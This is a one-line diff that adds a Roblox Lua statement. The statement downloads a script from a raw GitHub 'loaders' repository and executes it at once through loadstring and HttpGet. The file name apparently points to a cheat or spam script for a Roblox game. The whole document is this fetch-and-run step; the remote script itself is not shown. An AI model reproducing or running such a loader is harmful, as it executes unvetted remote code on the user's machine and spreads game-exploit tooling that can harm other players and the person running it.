@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/highwaymarevibrate/loaders/main/loaders/tha-bronx-3-spam6-j6zqq6scicdvvv.lua"))()
